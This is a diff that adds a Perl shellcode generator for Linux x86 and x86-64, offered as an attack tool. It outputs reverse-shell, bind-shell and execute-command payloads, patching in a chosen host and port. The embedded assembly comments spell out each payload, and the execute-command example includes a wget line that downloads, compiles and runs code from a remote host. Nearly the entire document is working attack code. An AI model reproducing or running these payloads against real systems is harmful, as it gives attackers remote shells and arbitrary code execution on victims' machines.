@@ -1,0 +1,428 @@
+#!/usr/bin/perl 
+# linux shellcode generator [x86,x86-64][reverse shell, bind shell, execute cmd] 
+# contact: xzid420[at]gmail.com 
+use strict; 
+use warnings; 
+use Getopt::Long; 
+ 
+my $comment=q{ 
+------------------------- 
+    reverse shell x86 
+------------------------- 
+  xor %edx,%edx 
+  push $0x06 
+  push $0x01 
+  push $0x02 
+  mov %esp,%ecx 
+  push $0x66 
+  pop %eax 
+  push $0x01 
+  pop %ebx 
+  int $0x80 
+  movb $0x02,(%esp) 
+  movw $0xbc01,2(%esp)        # htons(444); 
+  movl $0xa0a0a0a,4(%esp)     # inet_addr("10.10.10.10"); 
+  mov %esp,%ecx 
+  push $0x10 
+  push %ecx 
+  push %eax 
+  mov %esp,%ecx 
+  push %eax 
+  mov %esp,%ebp 
+  push $0x66 
+  pop %eax 
+  push $0x03 
+  pop %ebx 
+  int $0x80 
+  mov %ebp,%esp 
+  pop %ebx 
+  push $0x03 
+  pop %ecx 
+ 
+dup2loop: 
+  dec %ecx 
+  push $63 
+  pop %eax 
+  int $0x80 
+  jnz dup2loop 
+ 
+  push %edx 
+  push $0x68732f6e  # hs/n 
+  push $0x69622f2f  # ib// 
+  mov %esp,%ebx 
+  xor %ecx,%ecx 
+  push $0x0b 
+  pop %eax 
+  int $0x80 
+------------------------- 
+   reverse shell x86-64 
+------------------------- 
+  xorq %rdx,%rdx 
+  pushq $0x29 
+  pop %rax 
+  push $0x01 
+  pop %rsi 
+  push $0x02 
+  pop %rdi 
+  syscall 
+ 
+  xchgq %rax,%rdi 
+  movb $0x02,(%rsp) 
+  movw $0x6007,2(%rsp)         #; htons(1087); 
+  movl $0xa0a0a0a,4(%rsp)      #; inet_addr("10.10.10.10"); 
+  movq %rsp,%rsi 
+  push $0x10 
+  pop %rdx 
+  push $0x2a 
+  pop %rax 
+  syscall 
+  push $0x03 
+  pop %rsi 
+ 
+dup2loop: 
+  dec %rsi 
+  push $33 
+  pop %rax 
+  syscall 
+  jnz dup2loop 
+ 
+  xorq %rdx,%rdx 
+  movq $0x68732f6e69622f2f,%rbx 
+  shr $0x8,%rbx 
+  pushq %rbx 
+  movq %rsp,%rdi 
+  pushq %rdx 
+  pushq %rdi 
+  movq %rsp,%rsi 
+  push $59 
+  pop %rax 
+  syscall 
+------------------------- 
+     bind shell x86 
+------------------------- 
+  xor %edx,%edx 
+  push $0x06 
+  push $0x01 
+  push $0x02 
+  mov %esp,%ecx 
+  push $0x66 
+  pop %eax 
+  push $0x01 
+  pop %ebx 
+  int $0x80 
+ 
+  mov %eax,%edi 
+  movb $0x02,(%esp) 
+  movw $0xbc01,2(%esp)        # htons(444) 
+  movl %edx,4(%esp)           # 0[INADDR_ANY] 
+  mov %esp,%ecx 
+  push $0x10 
+  push %ecx 
+  push %eax 
+  mov %esp,%ecx 
+  push %eax 
+  mov %esp,%ebp 
+  push $0x66 
+  pop %eax 
+  push $0x02 
+  pop %ebx 
+  int $0x80 
+ 
+  push $0x05 
+  push %edi 
+  mov %esp,%ecx 
+  push $0x66 
+  pop %eax 
+  push $0x04 
+  pop %ebx 
+  int $0x80 
+ 
+  push %edx 
+  push %edx 
+  push %edi 
+  mov %esp,%ecx 
+  push $0x05 
+  pop %ebx 
+  push $0x66 
+  pop %eax 
+  int $0x80 
+  xchg %ebx,%eax 
+  push $0x03 
+  pop %ecx 
+ 
+dup2loop: 
+  dec %ecx 
+  push $63 
+  pop %eax 
+  int $0x80 
+  jnz dup2loop 
+ 
+  push %edx 
+  push $0x68732f6e  # hs/n 
+  push $0x69622f2f  # ib// 
+  mov %esp,%ebx 
+  xor %ecx,%ecx 
+  push $0x0b 
+  pop %eax 
+  int $0x80 
+------------------------- 
+    bind shell x86-64 
+------------------------- 
+  xorq %rdx,%rdx 
+  pushq $0x29 
+  pop %rax 
+  push $0x01 
+  pop %rsi 
+  push $0x02 
+  pop %rdi 
+  syscall 
+ 
+  xchgq %rax,%rdi 
+  xorq %rax,%rax 
+  movb $0x02,(%rsp) 
+  movw $0x6007,2(%rsp)         #; htons(1087); 
+  movl %eax,4(%rsp)            #; 0[INADDR_ANY] 
+  movq %rsp,%rsi 
+  push $0x10 
+  pop %rdx 
+  push $49 
+  pop %rax 
+  syscall 
+ 
+  push $0x01 
+  pop %rsi 
+  push $50 
+  pop %rax 
+  syscall 
+ 
+  xorq %rsi,%rsi 
+  xorq %rdx,%rdx 
+  push $43 
+  pop %rax 
+  syscall 
+ 
+  xchgq %rax,%rdi 
+  push $0x03 
+  pop %rsi 
+ 
+dup2loop: 
+  dec %rsi 
+  push $33 
+  pop %rax 
+  syscall 
+  jnz dup2loop 
+ 
+  xorq %rdx,%rdx 
+  movq $0x68732f6e69622f2f,%rbx 
+  shr $0x8,%rbx 
+  pushq %rbx 
+  movq %rsp,%rdi 
+  pushq %rdx 
+  pushq %rdi 
+  movq %rsp,%rsi 
+  push $59 
+  pop %rax 
+  syscall 
+------------------------- 
+     execute cmd x86 
+------------------------- 
+  jmp cmd 
+ 
+shellcode: 
+  pop %ecx 
+  xor %edx,%edx 
+  push %edx 
+  push $0x68732f6e    # hs/n 
+  push $0x69622f2f    # ib// 
+  mov %esp,%ebx 
+  movw $0x632d,%ax 
+  push %edx 
+  push %ax 
+  mov %esp,%eax 
+  push %edx 
+  push %ecx 
+  push %eax 
+  push %ebx 
+  mov %esp,%ecx 
+  push $0x0b 
+  pop %eax 
+  int $0x80 
+  push $0x01 
+  pop %eax 
+  xor %ebx,%ebx 
+  int $0x80 
+ 
+cmd: 
+  call shellcode 
+  .ascii "wget -q -O shell.c http://remote/file.c;gcc -o bind shell.c;./bind" 
+------------------------- 
+   execute cmd x86-64 
+------------------------- 
+  jmp cmd 
+ 
+shellcode: 
+  pop %rcx 
+  xorq %rdx,%rdx 
+  movq $0x68732f6e69622f2f,%rbx  # hs/nib// 
+  shr $0x8,%rbx 
+  push %rbx 
+  movq %rsp,%rdi 
+  movw $0x632d,%ax 
+  pushq %rdx 
+  pushq %ax 
+  movq %rsp,%rax 
+  pushq %rdx 
+  pushq %rcx 
+  pushq %rax 
+  pushq %rdi 
+  movq %rsp,%rsi 
+  xorq %rax,%rax 
+  movb $0x3b,%al 
+  syscall 
+  push $0x3c 
+  pop %rax 
+  xorq %rdi,%rdi 
+  syscall 
+ 
+cmd: 
+  call shellcode 
+  .string "wget -q -O shell.c http://remote/file.c;gcc -o bind shell.c;./bind" 
+------------------------- 
+}; 
+ 
+my($host,$port,$cmd,$amd64,$shellcode); 
+ 
+GetOptions("host=s" => \$host, 
+           "port=i" => \$port, 
+           "cmd=s"  => \$cmd, 
+           "64"     => \$amd64); 
+ 
+if($host and $port) 
+  { 
+  if($amd64) 
+    { 
+    # x86-64 reverse shell 
+    $shellcode= 
+	'\x48\x31\xd2\x6a\x29\x58\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x48\x97\xc6\x04\x24\x02\x66'. 
+	'\xc7\x44\x24\x02'.sport($port).'\xc7\x44\x24\x04'.saddr($host).'\x48\x89\xe6\x6a\x10'. 
+	'\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31'. 
+	'\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57'. 
+	'\x48\x89\xe6\x6a\x3b\x58\x0f\x05'; 
+    print "linux/x86-64 reverse shell\n\n"; 
+    } 
+  else 
+    { 
+    # x86 reverse shell 
+    $shellcode= 
+	'\x31\xd2\x6a\x06\x6a\x01\x6a\x02\x89\xe1\x6a\x66\x58\x6a\x01\x5b\xcd\x80\xc6\x04\x24'. 
+	'\x02\x66\xc7\x44\x24\x02'.sport($port).'\xc7\x44\x24\x04'.saddr($host).'\x89\xe1\x6a'. 
+	'\x10\x51\x50\x89\xe1\x50\x89\xe5\x6a\x66\x58\x6a\x03\x5b\xcd\x80\x89\xec\x5b\x6a\x03'. 
+	'\x59\x49\x6a\x3f\x58\xcd\x80\x75\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89'. 
+	'\xe3\x31\xc9\x6a\x0b\x58\xcd\x80'; 
+    print "linux/x86 reverse shell\n\n"; 
+    } 
+  print "host: $host\n", 
+	"port: $port\n"; 
+  } 
+elsif($port) 
+  { 
+  if($amd64) 
+    { 
+    # x86-64 bind shell 
+    $shellcode= 
+	'\x48\x31\xd2\x6a\x29\x58\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x48\x97\x48\x31\xc0\xc6\x04'. 
+	'\x24\x02\x66\xc7\x44\x24\x02'.sport($port).'\x89\x44\x24\x04\x48\x89\xe6\x6a\x10\x5a'. 
+	'\x6a\x31\x58\x0f\x05\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x31\xf6\x48\x31\xd2\x6a\x2b'. 
+	'\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xd2'. 
+	'\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48'. 
+	'\x89\xe6\x6a\x3b\x58\x0f\x05'; 
+    print "linux/x86-64 bind shell\n\n"; 
+    } 
+  else 
+    { 
+    # x86 bind shell 
+    $shellcode= 
+	'\x31\xd2\x6a\x06\x6a\x01\x6a\x02\x89\xe1\x6a\x66\x58\x6a\x01\x5b\xcd\x80\x89\xc7\xc6'. 
+	'\x04\x24\x02\x66\xc7\x44\x24\x02'.sport($port).'\x89\x54\x24\x04\x89\xe1\x6a\x10\x51'. 
+	'\x50\x89\xe1\x50\x89\xe5\x6a\x66\x58\x6a\x02\x5b\xcd\x80\x6a\x05\x57\x89\xe1\x6a\x66'. 
+	'\x58\x6a\x04\x5b\xcd\x80\x52\x52\x57\x89\xe1\x6a\x05\x5b\x6a\x66\x58\xcd\x80\x93\x6a'. 
+	'\x03\x59\x49\x6a\x3f\x58\xcd\x80\x75\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69'. 
+	'\x89\xe3\x31\xc9\x6a\x0b\x58\xcd\x80'; 
+    print "linux/x86 bind shell\n\n"; 
+    } 
+  print "port: $port\n"; 
+  } 
+elsif($cmd) 
+  { 
+  if($amd64) 
+    { 
+    # x86-64 execute cmd 
+    $shellcode= 
+	'\xeb\x35\x59\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53'. 
+	'\x48\x89\xe7\x66\xb8\x2d\x63\x52\x50\x48\x89\xe0\x52\x51\x50\x57\x48\x89\xe6\x48\x31'. 
+	'\xc0\xb0\x3b\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05\xe8\xc6\xff\xff\xff'.cmd($cmd); 
+    print "linux/x86-64 execute cmd\n\n"; 
+    } 
+  else 
+    { 
+    # x86 execute cmd 
+    $shellcode= 
+	'\xeb\x2b\x59\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x66\xb8\x2d'. 
+	'\x63\x52\x66\x50\x89\xe0\x52\x51\x50\x53\x89\xe1\x6a\x0b\x58\xcd\x80\x6a\x01\x58\x31'. 
+	'\xdb\xcd\x80\xe8\xd0\xff\xff\xff'.cmd($cmd); 
+    print "linux/x86 execute cmd\n\n"; 
+    } 
+  print "cmd: $cmd\n"; 
+  } 
+else 
+  { 
+  print "# linux shellcode generator [x86,x86-64][reverse shell, bind shell, execute cmd]\n\n", 
+	"reverse:\n", 
+	"  $0 --host <host> --port <port>\n\n", 
+	"bind:\n", 
+	"  $0 --port <port>\n\n", 
+	"cmd:\n", 
+	"  $0 --cmd <cmd>\n\n", 
+	"args:\n", 
+	"  --64            x86-64, default x86\n"; 
+  exit; 
+  } 
+ 
+print "shellcode length: ",shellcode_length($shellcode)," bytes\n\n", 
+      "-------------------------\n", 
+      $shellcode, 
+      "\n-------------------------\n"; 
+ 
+sub shellcode_length 
+  { 
+  my $scode=shift||return 0; 
+  my @p=split('x',$scode); 
+  return $#p; 
+  } 
+ 
+sub cmd 
+  { 
+  my $c=shift; 
+  $c=~s/(.)/sprintf("\\x%02x",ord($1))/eg; 
+  return $c; 
+  } 
+ 
+sub saddr 
+  { 
+  my $host=shift; 
+  my $s=gethostbyname($host) or die "error: host lookup failed\n"; 
+  my @sp=unpack('C4',$s); 
+  my $ret=""; 
+  for(<@sp>) {$ret.=sprintf("\\x%.2x",$_);} 
+  print ">> warning: host \"$host\" contains a null byte\n-----------\n" if($ret=~/00/); 
+  return $ret; 
+  } 
+ 
+sub sport 
+  { 
+  my $port=shift; 
+  die "port range: 300-20000\n" if($port<300||$port>20000); 
+  $port=sprintf("%.4x",$port); 
+  $port=~s/(.{2})/\\x$1/g; 
+  return $port; 
+  } 
